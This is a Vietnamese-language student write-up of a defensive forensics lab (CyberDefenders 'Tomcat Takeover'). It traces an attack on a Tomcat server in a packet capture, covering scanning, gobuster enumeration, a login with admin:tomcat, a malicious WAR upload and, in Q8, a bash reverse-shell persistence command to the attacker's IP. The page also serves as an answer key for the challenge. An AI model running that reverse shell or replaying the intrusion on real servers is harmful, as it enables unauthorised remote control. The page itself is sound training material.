<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-cyberdefenders-training/TomcatTakeover-lab" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">TomcatTakeover Lab | little Whale&#x27;s Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://ThienAnUIT2022.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://ThienAnUIT2022.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/TomcatTakeover-lab"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="TomcatTakeover Lab | little Whale&#x27;s Site"><meta data-rh="true" name="description" content="Ehe, nay tôi và cậu ấy làm bài lab nhỏ để không bị nhồi lý thuyết quá nhìuv. Của tôi và cậu ấy cũng chỉ là ghi lại quá trình làm thôi à..."><meta data-rh="true" property="og:description" content="Ehe, nay tôi và cậu ấy làm bài lab nhỏ để không bị nhồi lý thuyết quá nhìuv. Của tôi và cậu ấy cũng chỉ là ghi lại quá trình làm thôi à..."><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/TomcatTakeover-lab"><link data-rh="true" rel="alternate" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/TomcatTakeover-lab" hreflang="en"><link data-rh="true" rel="alternate" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/TomcatTakeover-lab" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="little Whale&#39;s Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="little Whale&#39;s Site Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.aff420c1.css">
<script src="/assets/js/runtime~main.42052f8d.js" defer="defer"></script>
<script src="/assets/js/main.1ee59b72.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/portfolio">Study with little Whale</a><a class="navbar__item navbar__link" href="/blog">little Whale&#x27;s autobiography</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/portfolio">I&#x27;m little Whale :3</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/gg-cybersec-cert">GG CyberSec Cert</a><button aria-label="Expand sidebar category &#x27;GG CyberSec Cert&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/letsdefend-soc-analyst">LetsDefend SOC Analyst</a><button aria-label="Expand sidebar category &#x27;LetsDefend SOC Analyst&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/cyberdefenders-training">CyberDefenders Training</a><button aria-label="Collapse sidebar category &#x27;CyberDefenders Training&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/Reveal-lab">Reveal Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/IcedID-lab">IcedID Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/cyberdefenders-training/TomcatTakeover-lab">TomcatTakeover Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/wireshark-cheatsheet">Wireshark Cheatsheet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/setting-lab">Set up Kali virtual machine for labs</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/nt114---endpoint-security">NT114 - Endpoint Security</a><button aria-label="Expand sidebar category &#x27;NT114 - Endpoint Security&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/nt207---risk-management--infosec">NT207 - Risk Management &amp; InfoSec</a><button aria-label="Expand sidebar category &#x27;NT207 - Risk Management &amp; InfoSec&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/internship-process">Internship Process</a><button aria-label="Expand sidebar category &#x27;Internship Process&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/cyberdefenders-training"><span itemprop="name">CyberDefenders Training</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">TomcatTakeover Lab</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>TomcatTakeover Lab</h1></header><p>Ehe, nay tôi và cậu ấy làm bài lab nhỏ để không bị nhồi lý thuyết quá nhìu :3 sẵn tiện ôn lại Threat Intel skill lun nha. Bài <a href="https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/" target="_blank" rel="noopener noreferrer">Tomcat Takeover</a> này ở mức dễ và cũng có hướng dẫn rồi nha, mọi người nên xem qua hướng dẫn để có nhiều thông tin và chính xác hơn <!-- -->:v<!-- -->. Của tôi và cậu ấy cũng chỉ là ghi lại quá trình làm thôi à...</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ngữ-cảnh">Ngữ cảnh<a href="#ngữ-cảnh" class="hash-link" aria-label="Direct link to Ngữ cảnh" title="Direct link to Ngữ cảnh">​</a></h2>
<p>Nhóm SOC đã xác định hoạt động đáng ngờ trên máy chủ web trong mạng nội bộ của công ty. Để hiểu rõ hơn về khai thác, họ đã nắm bắt lưu lượng mạng để phân tích. Tệp PCAP có thể chứa bằng chứng về các hoạt động độc hại dẫn đến sự thỏa hiệp của máy chủ web Apache Tomcat. Nhiệm vụ của bạn là phân tích tệp PCAP để hiểu phạm vi của cuộc tấn công.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="công-cụ-sử-dụng">Công cụ sử dụng<a href="#công-cụ-sử-dụng" class="hash-link" aria-label="Direct link to Công cụ sử dụng" title="Direct link to Công cụ sử dụng">​</a></h2>
<ul>
<li><a href="https://www.wireshark.org/download.html" target="_blank" rel="noopener noreferrer">Wireshark</a>: Đây là công cụ phân tích gói tin mạng miễn phí và mạnh mẽ nhất hiện nay. Wireshark cho phép theo dõi lưu lượng mạng, trích xuất dữ liệu từ file .pcap, lọc, tìm kiếm và phân tích các kết nối, yêu cầu HTTP, thông tin đăng nhập, tải lên tệp độc hại, và nhiều hoạt động khả nghi khác. Trong bài này, Wireshark được dùng để lần theo dấu vết attacker từ lúc quét cổng cho đến khi thiết lập kết nối reverse shell thành công.</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="câu-hỏi">Câu hỏi<a href="#câu-hỏi" class="hash-link" aria-label="Direct link to Câu hỏi" title="Direct link to Câu hỏi">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q1-hãy-xác-định-địa-chỉ-ip-nguồn-đã-khởi-tạo-các-yêu-cầu-này-trên-máy-chủ-của-chúng-ta">Q1: Hãy xác định địa chỉ IP nguồn đã khởi tạo các yêu cầu này trên máy chủ của chúng ta?<a href="#q1-hãy-xác-định-địa-chỉ-ip-nguồn-đã-khởi-tạo-các-yêu-cầu-này-trên-máy-chủ-của-chúng-ta" class="hash-link" aria-label="Direct link to Q1: Hãy xác định địa chỉ IP nguồn đã khởi tạo các yêu cầu này trên máy chủ của chúng ta?" title="Direct link to Q1: Hãy xác định địa chỉ IP nguồn đã khởi tạo các yêu cầu này trên máy chủ của chúng ta?">​</a></h3>
<p>Từ phân tích pcap, hoạt động đáng ngờ cho thấy một loạt yêu cầu qua nhiều cổng, gợi ý hành vi quét.</p>
<table><thead><tr><th>Trả lời</th><th>14.0.0.120</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Địa chỉ IP nguồn phát tán gói quét.</li>
<li><strong>Tìm ở đâu:</strong> Trong file pcap, sử dụng Wireshark.</li>
<li><strong>Tìm thế nào:</strong> Lọc theo địa chỉ IP (ví dụ <code>ip.src == x.x.x.x</code>), hoặc dùng Statistics → Endpoints/Conversations để xem host gửi nhiều gói nhất.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q2-bạn-có-thể-xác-định-thành-phố-nơi-hoạt-động-của-attacker-bắt-nguồn-không">Q2: Bạn có thể xác định thành phố nơi hoạt động của attacker bắt nguồn không?<a href="#q2-bạn-có-thể-xác-định-thành-phố-nơi-hoạt-động-của-attacker-bắt-nguồn-không" class="hash-link" aria-label="Direct link to Q2: Bạn có thể xác định thành phố nơi hoạt động của attacker bắt nguồn không?" title="Direct link to Q2: Bạn có thể xác định thành phố nơi hoạt động của attacker bắt nguồn không?">​</a></h3>
<p>Dựa trên địa chỉ IP attacker đã xác định,</p>
<table><thead><tr><th>Trả lời</th><th>China</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Thành phố (city) trong thông tin WHOIS.</li>
<li><strong>Tìm ở đâu:</strong> Công cụ tra cứu WHOIS (whois.com, whois CLI…).</li>
<li><strong>Tìm thế nào:</strong> Sao chép IP vào dịch vụ WHOIS, tìm trường “City”.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q3-cổng-nào-trong-số-này-cung-cấp-quyền-truy-cập-vào-giao-diện-quản-trị-web-server">Q3: Cổng nào trong số này cung cấp quyền truy cập vào giao diện quản trị web server?<a href="#q3-cổng-nào-trong-số-này-cung-cấp-quyền-truy-cập-vào-giao-diện-quản-trị-web-server" class="hash-link" aria-label="Direct link to Q3: Cổng nào trong số này cung cấp quyền truy cập vào giao diện quản trị web server?" title="Direct link to Q3: Cổng nào trong số này cung cấp quyền truy cập vào giao diện quản trị web server?">​</a></h3>
<p>Từ phân tích pcap, nhiều cổng mở đã được phát hiện do quá trình quét.</p>
<table><thead><tr><th>Trả lời</th><th>8080</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Số cổng HTTP Admin (thường là 8080 trên Tomcat).</li>
<li><strong>Tìm ở đâu:</strong> Trong luồng pcap giữa attacker và server.</li>
<li><strong>Tìm thế nào:</strong> Lọc theo IP attacker và IP server rồi xem port đích phổ biến nhất, hoặc filter <code>tcp.port == 8080</code>.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q4-các-công-cụ-nào-bạn-xác-định-được-hỗ-trợ-attacker-trong-quá-trình-liệt-kê-này">Q4: Các công cụ nào bạn xác định được hỗ trợ attacker trong quá trình liệt kê này?<a href="#q4-các-công-cụ-nào-bạn-xác-định-được-hỗ-trợ-attacker-trong-quá-trình-liệt-kê-này" class="hash-link" aria-label="Direct link to Q4: Các công cụ nào bạn xác định được hỗ trợ attacker trong quá trình liệt kê này?" title="Direct link to Q4: Các công cụ nào bạn xác định được hỗ trợ attacker trong quá trình liệt kê này?">​</a></h3>
<p>Sau khi phát hiện các cổng mở, attacker đã cố gắng liệt kê và khám phá thư mục trên web server.</p>
<table><thead><tr><th>Trả lời</th><th>gobuster</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tên công cụ liệt kê thư mục (User‑Agent).</li>
<li><strong>Tìm ở đâu:</strong> Trong tiêu đề HTTP request (User‑Agent).</li>
<li><strong>Tìm thế nào:</strong> Lọc HTTP GET requests, xem trường User‑Agent.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q5-thư-mục-cụ-thể-nào-liên-quan-đến-admin-panel-mà-attacker-phát-hiện-được">Q5: Thư mục cụ thể nào liên quan đến admin panel mà attacker phát hiện được?<a href="#q5-thư-mục-cụ-thể-nào-liên-quan-đến-admin-panel-mà-attacker-phát-hiện-được" class="hash-link" aria-label="Direct link to Q5: Thư mục cụ thể nào liên quan đến admin panel mà attacker phát hiện được?" title="Direct link to Q5: Thư mục cụ thể nào liên quan đến admin panel mà attacker phát hiện được?">​</a></h3>
<p>Tiếp theo nỗ lực liệt kê, attacker gửi nhiều yêu cầu để tìm giao diện quản trị.</p>
<table><thead><tr><th>Trả lời</th><th>/manager</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Đường dẫn (path) dẫn tới admin panel (<code>/manager</code>, <code>/admin</code>…).</li>
<li><strong>Tìm ở đâu:</strong> Trong HTTP GET responses.</li>
<li><strong>Tìm thế nào:</strong> Filter <code>http.request.uri contains &quot;admin&quot;</code> rồi xem mã HTTP 401/200.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q6-từ-dữ-liệu-bạn-có-thể-xác-định-cặp-username-chính-xác-mà-attacker-đã-dùng-thành-công-không">Q6: Từ dữ liệu, bạn có thể xác định cặp username<!-- -->:password<!-- --> chính xác mà attacker đã dùng thành công không?<a href="#q6-từ-dữ-liệu-bạn-có-thể-xác-định-cặp-username-chính-xác-mà-attacker-đã-dùng-thành-công-không" class="hash-link" aria-label="Direct link to q6-từ-dữ-liệu-bạn-có-thể-xác-định-cặp-username-chính-xác-mà-attacker-đã-dùng-thành-công-không" title="Direct link to q6-từ-dữ-liệu-bạn-có-thể-xác-định-cặp-username-chính-xác-mà-attacker-đã-dùng-thành-công-không">​</a></h3>
<p>Khi truy cập vào admin panel, attacker thử brute-force đăng nhập.</p>
<table><thead><tr><th>Trả lời</th><th>admin<!-- -->:tomcat</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Basic Auth credentials (Base64).</li>
<li><strong>Tìm ở đâu:</strong> Trong HTTP POST hoặc header Authorization.</li>
<li><strong>Tìm thế nào:</strong> Filter <code>http.request.method == &quot;POST&quot;</code> hoặc <code>http.authbasic</code> → giải mã Base64.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q7-bạn-có-thể-xác-định-tên-tệp-độc-hại-này-từ-dữ-liệu-capture-không">Q7: Bạn có thể xác định tên tệp độc hại này từ dữ liệu capture không?<a href="#q7-bạn-có-thể-xác-định-tên-tệp-độc-hại-này-từ-dữ-liệu-capture-không" class="hash-link" aria-label="Direct link to Q7: Bạn có thể xác định tên tệp độc hại này từ dữ liệu capture không?" title="Direct link to Q7: Bạn có thể xác định tên tệp độc hại này từ dữ liệu capture không?">​</a></h3>
<p>Sau khi đăng nhập, attacker đã tải lên một tệp để thiết lập reverse shell.</p>
<table><thead><tr><th>Trả lời</th><th>JXQOZY.war</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tên file được upload (ví dụ <code>*.war</code>).</li>
<li><strong>Tìm ở đâu:</strong> Trong HTTP POST tới <code>/manager/html/upload</code>.</li>
<li><strong>Tìm thế nào:</strong> Filter <code>http.request.uri contains &quot;/upload&quot;</code> và xem phần payload chứa tên file.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="q8-từ-phân-tích-bạn-có-thể-xác-định-lệnh-cụ-thể-mà-họ-lên-lịch-chạy-để-duy-trì-sự-hiện-diện-không">Q8: Từ phân tích, bạn có thể xác định lệnh cụ thể mà họ lên lịch chạy để duy trì sự hiện diện không?<a href="#q8-từ-phân-tích-bạn-có-thể-xác-định-lệnh-cụ-thể-mà-họ-lên-lịch-chạy-để-duy-trì-sự-hiện-diện-không" class="hash-link" aria-label="Direct link to Q8: Từ phân tích, bạn có thể xác định lệnh cụ thể mà họ lên lịch chạy để duy trì sự hiện diện không?" title="Direct link to Q8: Từ phân tích, bạn có thể xác định lệnh cụ thể mà họ lên lịch chạy để duy trì sự hiện diện không?">​</a></h3>
<p>Sau khi thiết lập reverse shell thành công, attacker muốn duy trì truy cập.</p>
<table><thead><tr><th>Trả lời</th><th>/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#x27;</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table>
<ul>
<li><strong>Tìm cái gì:</strong> Lệnh persistence (cronjob, systemd unit…).</li>
<li><strong>Tìm ở đâu:</strong> Trong nội dung reverse shell (Follow TCP Stream).</li>
<li><strong>Tìm thế nào:</strong> Sử dụng Follow TCP Stream trên phiên shell, tìm lệnh <code>crontab</code>, <code>echo &quot;* * * * * ...&quot;</code> hoặc tương tự.</li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/cyberdefenders-training/TomcatTakeover-lab.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/cyberdefenders-training/IcedID-lab"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">IcedID Lab</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/cyberdefenders-training/wireshark-cheatsheet"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Wireshark Cheatsheet</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ngữ-cảnh" class="table-of-contents__link toc-highlight">Ngữ cảnh</a></li><li><a href="#công-cụ-sử-dụng" class="table-of-contents__link toc-highlight">Công cụ sử dụng</a></li><li><a href="#câu-hỏi" class="table-of-contents__link toc-highlight">Câu hỏi</a><ul><li><a href="#q1-hãy-xác-định-địa-chỉ-ip-nguồn-đã-khởi-tạo-các-yêu-cầu-này-trên-máy-chủ-của-chúng-ta" class="table-of-contents__link toc-highlight">Q1: Hãy xác định địa chỉ IP nguồn đã khởi tạo các yêu cầu này trên máy chủ của chúng ta?</a></li><li><a href="#q2-bạn-có-thể-xác-định-thành-phố-nơi-hoạt-động-của-attacker-bắt-nguồn-không" class="table-of-contents__link toc-highlight">Q2: Bạn có thể xác định thành phố nơi hoạt động của attacker bắt nguồn không?</a></li><li><a href="#q3-cổng-nào-trong-số-này-cung-cấp-quyền-truy-cập-vào-giao-diện-quản-trị-web-server" class="table-of-contents__link toc-highlight">Q3: Cổng nào trong số này cung cấp quyền truy cập vào giao diện quản trị web server?</a></li><li><a href="#q4-các-công-cụ-nào-bạn-xác-định-được-hỗ-trợ-attacker-trong-quá-trình-liệt-kê-này" class="table-of-contents__link toc-highlight">Q4: Các công cụ nào bạn xác định được hỗ trợ attacker trong quá trình liệt kê này?</a></li><li><a href="#q5-thư-mục-cụ-thể-nào-liên-quan-đến-admin-panel-mà-attacker-phát-hiện-được" class="table-of-contents__link toc-highlight">Q5: Thư mục cụ thể nào liên quan đến admin panel mà attacker phát hiện được?</a></li><li><a href="#q6-từ-dữ-liệu-bạn-có-thể-xác-định-cặp-username-chính-xác-mà-attacker-đã-dùng-thành-công-không" class="table-of-contents__link toc-highlight">Q6: Từ dữ liệu, bạn có thể xác định cặp username chính xác mà attacker đã dùng thành công không?</a></li><li><a href="#q7-bạn-có-thể-xác-định-tên-tệp-độc-hại-này-từ-dữ-liệu-capture-không" class="table-of-contents__link toc-highlight">Q7: Bạn có thể xác định tên tệp độc hại này từ dữ liệu capture không?</a></li><li><a href="#q8-từ-phân-tích-bạn-có-thể-xác-định-lệnh-cụ-thể-mà-họ-lên-lịch-chạy-để-duy-trì-sự-hiện-diện-không" class="table-of-contents__link toc-highlight">Q8: Từ phân tích, bạn có thể xác định lệnh cụ thể mà họ lên lịch chạy để duy trì sự hiện diện không?</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" 